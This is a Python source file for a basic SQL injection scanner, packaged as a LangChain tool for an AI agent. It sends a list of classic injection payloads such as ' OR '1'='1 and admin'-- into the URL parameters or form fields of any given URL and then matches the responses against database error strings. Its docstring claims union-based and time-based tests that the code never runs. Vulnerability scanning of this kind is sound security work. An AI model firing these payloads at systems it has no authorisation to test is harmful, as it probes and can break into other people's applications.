"""
SQL Injection Testing Tool

Tests for SQL injection vulnerabilities by injecting common SQLi payloads and analyzing responses.
"""

from typing import Optional, Dict, Any
import requests
from langchain_core.tools import StructuredTool


def test_sql_injection_patterns(url: str, form_data: Optional[Dict[str, Any]] = None) -> str:
    """
    Test for SQL injection vulnerabilities by injecting common SQLi payloads.
    
    Tests for:
    - Error-based SQL injection
    - Union-based SQL injection
    - Boolean-based blind SQL injection
    - Time-based blind SQL injection
    
    Args:
        url: The URL to test (can include query parameters)
        form_data: Optional dictionary of form data to test (if None, tests URL parameters)
        
    Returns:
        Analysis report of SQL injection test results
    """
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        # Common SQL injection payloads
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin'/*",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR 1=1--",
            "') OR ('1'='1",
            "1' OR '1'='1",
            "1' OR 1=1#",
            "' OR 1=1#",
            "1' OR '1'='1'--",
            "1' OR '1'='1'/*",
        ]
        
        vulnerabilities = []
        error_patterns = [
            "sql syntax",
            "mysql",
            "postgresql",
            "sqlite",
            "ora-",
            "microsoft ole db",
            "odbc",
            "sql server",
            "sql error",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
        ]
        
        # Test URL parameters if no form data provided
        if form_data is None:
            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if params:
                for param_name, param_values in params.items():
                    for payload in sqli_payloads[:5]:  # Test first 5 payloads per parameter
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, urlencode(test_params, doseq=True), parsed.fragment
                        ))
                        
                        try:
                            response = requests.get(test_url, headers=headers, timeout=5)
                            response_lower = response.text.lower()
                            
                            # Check for SQL error messages
                            for pattern in error_patterns:
                                if pattern in response_lower:
                                    vulnerabilities.append(
                                        f"⚠ POTENTIAL SQL INJECTION in parameter '{param_name}' - "
                                        f"SQL error detected: {pattern}"
                                    )
                                    break
                            
                            # Check for different responses (boolean-based blind)
                            if len(response.text) != len(requests.get(url, headers=headers, timeout=5).text):
                                vulnerabilities.append(
                                    f"⚠ POTENTIAL SQL INJECTION in parameter '{param_name}' - "
                                    f"Response length differs (possible blind SQLi)"
                                )
                        except:
                            pass
        else:
            # Test form data
            for field_name, field_value in form_data.items():
                for payload in sqli_payloads[:3]:  # Test first 3 payloads per field
                    test_data = form_data.copy()
                    test_data[field_name] = payload
                    
                    try:
                        response = requests.post(url, data=test_data, headers=headers, timeout=5)
                        response_lower = response.text.lower()
                        
                        # Check for SQL error messages
                        for pattern in error_patterns:
                            if pattern in response_lower:
                                vulnerabilities.append(
                                    f"⚠ POTENTIAL SQL INJECTION in field '{field_name}' - "
                                    f"SQL error detected: {pattern}"
                                )
                                break
                    except:
                        pass
        
        # Build report
        report = f"SQL Injection Testing for {url}\n"
        report += "=" * 60 + "\n\n"
        
        if vulnerabilities:
            report += "⚠ POTENTIAL SQL INJECTION VULNERABILITIES FOUND:\n"
            for vuln in vulnerabilities:
                report += f"  {vuln}\n"
            report += "\n"
        else:
            report += "✓ No obvious SQL injection vulnerabilities detected\n\n"
        
        report += "Note: This is a basic test using common payloads. "
        report += "Manual verification and deeper testing recommended for any potential vulnerabilities."
        
        return report
        
    except Exception as e:
        return f"Error testing SQL injection patterns for {url}: {str(e)}"


def get_sqli_test_tool() -> StructuredTool:
    """
    Create and return the test_sql_injection_patterns tool for use with LangChain agents.
    
    Returns:
        StructuredTool instance for testing SQL injection vulnerabilities
    """
    return StructuredTool.from_function(
        func=test_sql_injection_patterns,
        name="test_sql_injection_patterns",
        description="Test for SQL injection vulnerabilities by injecting SQLi payloads into URL parameters or form fields. Detects error-based and blind SQL injection. Input: url (the URL to test, can include query parameters), form_data (optional dict of form fields to test)"
    )

